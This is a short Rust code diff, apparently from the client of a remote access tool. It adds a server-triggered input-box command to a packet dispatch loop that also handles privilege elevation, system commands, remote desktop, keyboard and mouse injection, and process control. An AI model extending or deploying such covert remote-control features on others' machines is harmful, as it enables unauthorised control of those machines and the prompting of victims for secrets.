@@ -1,4 +1,4 @@
-use crate::features::other::{visit_website, show_messagebox, elevate_client, system_commands};
+use crate::features::other::{visit_website, show_messagebox, elevate_client, system_commands, handle_input_command};
 use crate::features::collectors::client_info;
 use crate::features::remote_desktop::{take_screenshot, start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
 use crate::features::process::{process_list, kill_process, start_process, suspend_process, resume_process};
@@ -85,6 +85,8 @@ pub async fn reading_loop(
             Ok(Some(ClientboundPacket::VisitWebsite(visit_data))) => visit_website(&visit_data),
 
             Ok(Some(ClientboundPacket::ShowMessageBox(message_box_data))) => show_messagebox(message_box_data),
+
+            Ok(Some(ClientboundPacket::ShowInputBox(input_box_data))) => handle_input_command(input_box_data),
 
             Ok(Some(ClientboundPacket::ElevateClient)) => elevate_client(),
 
